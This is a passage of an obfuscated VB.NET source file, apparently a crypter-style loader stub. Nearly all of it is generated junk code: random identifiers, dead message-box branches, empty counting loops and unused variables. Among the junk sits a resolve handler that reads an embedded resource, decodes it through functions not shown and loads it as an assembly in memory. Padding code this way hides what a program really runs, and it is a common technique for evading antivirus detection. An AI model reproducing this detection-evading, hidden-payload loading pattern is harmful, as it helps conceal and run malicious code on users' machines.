        If QGDFgjQp = True Then
            MsgBox("MHNRAooq")
        End If
        Dim HIXdUsLs As Integer = 511
        Dim DIhppxjt As String = "zJrAJBGu"
        Dim uKBMeGev As Integer = 982
        Dim qKLYyKBw As Integer = 721
        Return "lLVkTOZy"
    End Function
    Public Shared Function BUeAxxIs()
        Dim sWyYmGDv As Integer = 193
        Dim oWIkGLaw As Boolean = False
        If oWIkGLaw = True Then
            MsgBox("jXSwbPyx")
        End If
        Dim fYcIvUVy As Boolean = True
        If fYcIvUVy = False Then
            MsgBox("aYnUQYtz")
        End If
        Dim WZxfkdQA As Boolean = True
        If WZxfkdQA = False Then
            MsgBox("RaHrFhnC")
        End If
        Dim zFInvzoR As Boolean = True
        If zFInvzoR = False Then
            MsgBox("vGSzQELS")
        End If
        Dim qHcLkIiT As Object = {}
        Dim mHmXENGV As Long = 693
        Dim hIwiZRdW As Byte() = {}
        Dim dJGutWBX As Integer = 892
        Dim YJQGOaYY As Boolean = False
        If YJQGOaYY = True Then
            MsgBox("UKaSiewZ")
        End If
        Dim QLkeDjTa As Integer = 390
        Return "LLuqXnrc"
    End Function
    Public Shared Function feZgNLum()
        Dim pUpWnBdV As Integer = 382
        Dim BabYPpgg As Integer = 0
        For NgObrdkr = 0 To 100
            BabYPpgg += 1
        Next
        Dim ZmAeTRnB As Integer = 0
        For XXdRRTTa = 0 To 100
            ZmAeTRnB += 1
        Next
        Dim jdPUtGWl As String = "vjCXVuav"
        Dim HpoaxidG As Boolean = False
        If HpoaxidG = True Then
            MsgBox("FaRNvkJf")
        End If
        Dim RgEQXYMq As Long = 626
        Dim dlqTzMQA As Integer = 0
        For cWTFxOwZ = 0 To 100
            dlqTzMQA += 1
        Next
        Dim ocFIZCzk As Boolean = True
        If ocFIZCzk = False Then
            MsgBox("AisLBqCu")
        End If
        Dim MoeOceGF As Object = {}
        Dim KZHBagme As Boolean = True
        If KZHBagme = False Then
            MsgBox("WfuECUpo")
        End If
        Return "ilgHeIsz"
    End Function
    Public Shared Sub ePluYHl()
        Dim GrGwlFS As Object = {}
        Dim yrRIenU As Integer = 210
        Dim NVQuAyT As Integer = 508
        Dim XqaLDOV As Long = 81
        Dim NlNriyX As Long = 565
        Dim fphXuHK As String = "QnUCFvl"
    End Sub
    Public Shared Function nWoAFXlV()
        Dim LiNGJzsq As Integer = 0
        For qdvbWUji = 0 To 100
            LiNGJzsq += 1
        Next
        Dim VYcwjpba As Integer = 268
        Dim AUKRwKSR As Boolean = False
        If AUKRwKSR = True Then
            MsgBox("tkBCmRhvIP")
        End If
        Dim LnMWDzcpWk As Object = {}
        Dim kwTGPZxwlE As Boolean = False
        If kwTGPZxwlE = True Then
            MsgBox("zWbnnLEgoV")
        End If
        Dim SNnETkOQck As String = "BVbQrCoUME"
        Dim rkKqLMpkvY As Boolean = False
        If rkKqLMpkvY = True Then
            MsgBox("HumyMvFsor")
        End If
        Dim gLJUKXwNiK As Boolean = False
        If gLJUKXwNiK = True Then
            MsgBox("fZZXpYBame")
        End If
        Dim XXcZmfLNLA As Integer = 952
        Dim EnfXvyHfZT As Object = {}
        Dim tJfkAJdJnl As Integer = 0
        For IcXenuPgMD = 0 To 100
            tJfkAJdJnl += 1
        Next
        Return "RgCXslEdFY"
    End Function
    Public Shared Function smWJkOni()
        Dim jnqgZXik As Object = {}
        Dim xewKeItT As Integer = 715
        Dim apKEOgdn As String = "ofQiTRoV"
        Dim RqecDpYp As Object = {}
        Dim ggkGIajX As Boolean = True
        If ggkGIajX = False Then
            MsgBox("uWpjOLvG")
        End If
        Dim XhEdxjea As Byte() = {}
        Dim lYJHDUqI As Byte() = {}
        Dim OjYBmsZc As Integer = 0
        For PEUPOrOZ = 0 To 100
            OjYBmsZc += 1
        Next
        Dim rPjJxPxt As Boolean = True
        If rPjJxPxt = False Then
            MsgBox("GFomCAJb")
        End If
        Return "iQDgmYsv"
    End Function
    Public Shared Sub YbiHLvj()
        Dim pfCnXEW As Object = {}

        Dim adqRisx As Object = {}

        Dim PWvDLdB As Object = {}
        Dim XRkaYvP As String = "OYMZCfn"
        Dim uAWQuYw As Long = 90
    End Sub

    Private Shared Function CuhtWuQ(sender As Object, iczLEOC As System.ResolveEventArgs) As System.Reflection.Assembly

        'get the root namespace (im tired of manually adding this)
        Dim ukdDTULAECN As Long = 355
        Dim IWscahgQIyC As String = "KkGehEHKzgt"
        Dim ipxsbHVVUHk As Byte() = {}
        Dim ZpJFUpXqwSU As Boolean = True
        If ZpJFUpXqwSU = False Then
            MsgBox("MggxuccOqND")
        End If
        Dim YsabLqJFCwN As Boolean = True
        If YsabLqJFCwN = False Then
            MsgBox("CMernnTqCVB")
        End If
        Dim pHJKTHD As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly

        Dim hIyYWdnR = mHoMBYQP()
        Dim RNZnJfC As String = Strings.Left(pHJKTHD.EntryPoint.DeclaringType.Namespace, pHJKTHD.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        Dim pxDSQvrNHE As Long = 545
        Dim FIeZRfHVAY As Integer = 737
        Dim QEtflUbEPu As String = "ORJiQVhRTO"
        Dim VlUArPNqXg As Byte() = {}
        'fuck ya! Im done manually adding that shit!!!

        Dim tcSYhucU = fmMucIQm()
        Dim GuXhCqt As String = RNZnJfC + New Reflection.AssemblyName(iczLEOC.Name).Name + ".dll"

        mrMufxL()
        'resourceName = "dll.dll"
        Dim YBscvgbXlB As Long = 286
        Dim tLJYcLUePv As Boolean = True
        If tLJYcLUePv = False Then
            MsgBox("FWvryzHoYp")
        End If
        Dim cYwAucehXk As Byte() = {}
        Dim DxaxIBTPgc As Integer = 933
        Dim pMTkxPrfeV As Integer = 743
        Using lkGmVLA = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(GuXhCqt)
            Dim hSYkCtyQBjd As Boolean = False
            If hSYkCtyQBjd = True Then
                MsgBox("spQvHHzGLHf")
            End If
            Dim brwfpywdSSw As Object = {}
            Dim WoPmLecMMMn As Byte() = {}
            Dim eWQqZwUBjAW As Object = {}
            Dim wHVCMERRYWV As Object = {}

            Dim PHaLUteYWl As Long = 476
            Dim hKlgkbYSkG As String = "HTsPxBtYza"
            Dim VtAwVnBJCs As Boolean = True
            If VtAwVnBJCs = False Then
                MsgBox("dFwbLfMUbL")
            End If
            Dim LNjnjxmYKg As Byte() = {}
            Dim DhRqrtK = New Byte(lkGmVLA.Length - 1) {}

            ENgMyAQ()
            'decode assembly here
            Dim NOYGjuTYkxC As Boolean = True
            If NOYGjuTYkxC = False Then
                MsgBox("kzTHBxtmJtK")
            End If
            Dim fGkuLctUAdt As Long = 117
            Dim sVMTfpYvfCG As Integer = 657
            Dim vEXiNMnmSQf As Integer = 0
            For rtaCyqyHhLi = 0 To 100
                vEXiNMnmSQf += 1
            Next
            Dim vzYSTMDmtvk As Long = 858


            ROaqQMI()
            lkGmVLA.Read(DhRqrtK, 0, DhRqrtK.Length)
            Dim lgtkFNzhqq As Boolean = True
            If lgtkFNzhqq = False Then
                MsgBox("DiEFVvtbEL")
            End If
            Dim dsMphVOiTf As Integer = 382
            Dim rSUVFHVSWw As Object = {}
            Dim zePBvzgdvQ As Integer = 0
            For hmCMTRGhek = 0 To 100
                zePBvzgdvQ += 1
            Next
            Dim XAmnnbHxNE As Boolean = False
            If XAmnnbHxNE = True Then
                MsgBox("oLNvoKXFHX")
            End If
            DhRqrtK = GoYRIqI(KtNWhlV(DhRqrtK))

            Dim gnaLpsae = BrsqcXim()
            Return Reflection.Assembly.Load(DhRqrtK)
            Dim ZZIhauyVpZ As Boolean = False
            If ZZIhauyVpZ = True Then
                MsgBox("IhvtxMYZYu")
            End If
            Dim yweURWZoHN As Byte() = {}
            Dim OGGbTFpxBh As Boolean = False
            If OGGbTFpxBh = True Then
                MsgBox("ZCVhmvIfPD")
            End If
            Dim YQkkSwOtTX As Boolean = False
            If YQkkSwOtTX = True Then
                MsgBox("ejwCtpvSXp")
            End If


            OlNyxBU()
        End Using ' stream
        Dim JSEnAktQAyR As Integer = 265
        Dim eVOHroIrCjF As Boolean = False
        If eVOHroIrCjF = True Then
            MsgBox("xHTUewFGrFE")
        End If
        Dim VRjPmxT As Long = 313
        Dim oNmINFk As Boolean = False
        If oNmINFk = True Then
            MsgBox("utFSYYe")
        End If
        Dim yzDhtvj As Boolean = False
        If yzDhtvj = True Then
            MsgBox("owgAjen")
        End If
    End Function

    Public Shared Function mHoMBYQP()
        Dim dJIjqhLS As Integer = 0
        For YJSvLmiT = 0 To 100
            dJIjqhLS += 1
        Next
        Dim UKcHfqGU As Long = 44
        Dim PLmTAudV As Boolean = False
        If PLmTAudV = True Then
            MsgBox("LLwfUzBX")
        End If
        Dim GMGrpDYY As Boolean = True
        If GMGrpDYY = False Then
            MsgBox("CMQDJIvZ")
        End If
        Dim yNaPdMTa As Boolean = True
        If yNaPdMTa = False Then
            MsgBox("tOkbyRqb")
        End If
        Dim pOumSVO As Object = {}
        Dim iHpMaCu As Boolean = False
        If iHpMaCu = True Then
            MsgBox("fncuafj")
        End If
        Dim rAWYstP As Boolean = True
        If rAWYstP = False Then
            MsgBox("roPgITC")
        End If
        Dim JkSajaT As Integer = 622
        Dim QQljuuN As Long = 333
        Return "TWjzPQT"
    End Function
    Public Shared Function fmMucIQm()
        Dim WngSRRLo As Integer = 0
        For kdmwWDXX = 0 To 100
            WngSRRLo += 1
        Next
        Dim NoAqGaGr As Object = {}
        Dim beGULMSZ As Integer = 957
        Dim EqUOvjBt As Long = 647
        Dim TgarAUNb As Long = 134
        Dim vroljsww As String = "KhuPpdIe"
        Dim msIJYBry As Boolean = False
        If msIJYBry = True Then
            MsgBox("nNFXAAfv")
        End If
        Dim PYTRjYOP As Boolean = False
        If PYTRjYOP = True Then
            MsgBox("eOZupJax")
        End If
        Dim GaooYgJR As Long = 40
        Return "VQtSeSVz"
    End Function
    Public Shared Sub mrMufxL()


        Dim kGkIFYJ As Long = 874

        Dim ptTEBtZ As Integer = 60
    End Sub
    Public Shared Sub ENgMyAQ()
        Dim GbuOEXr As Object = {}
        Dim AAbVnDi As String = "rICUSnG"
        Dim YkNKKgO As String = "TrfyULP"

        Dim CawPdBW As String = "SmghaLf"
        Dim IMWAewt As Long = 616
    End Sub
    Public Shared Sub ROaqQMI()

        Dim btjoHbe As Object = {}
        Dim iGnetui As Integer = 839
        Dim gnaMsXX As Integer = 528
        Dim rzUqKlD As Object = {}

    End Sub
    Public Shared Function BrsqcXim()
        Dim LiIgCNRW As Byte() = {}
        Dim qdqBPiJN As Long = 414
        Dim jugmGpYr As Boolean = False
        If jugmGpYr = True Then
            MsgBox("OpOHTKQj")
        End If
        Dim tlwbgfHa As Integer = 0
        For YgewtAzS = 0 To 100
            tlwbgfHa += 1
        Next
        Dim RxVhkHOw As Boolean = True
        If RxVhkHOw = False Then
            MsgBox("wsCCxcFn")
        End If
        Dim bnkXKxxf As Object = {}
        Dim HjSsXSpX As Long = 969
        Dim meANkmgP As Long = 875
        Dim fvqyatvs As Byte() = {}
        Dim KqYTnOnkYO As String = "ctjnEwhenj"
        Return "PXAnuJaWgA"
    End Function
    Public Shared Sub OlNyxBU()


        Dim fpheJKH As Integer = 623
        Dim DRLsqML As Long = 642
        Dim FfZuxkm As Long = 476

    End Sub

End Class
Public Class Tuple(Of T1, T2)
    Public Property Item1() As T1
        Get
            Return m_Item1
        End Get
        Set
            m_Item1 = Value
        End Set
    End Property
    Private m_Item1 As T1
    Public Property Item2() As T2
        Get
            Return m_Item2
        End Get
        Set
            m_Item2 = Value
        End Set
    End Property
    Private m_Item2 As T2
    Public Sub New(Item1 As T1, Item2 As T2)
        Me.Item1 = Item1
        Me.Item2 = Item2
    End Sub
End Class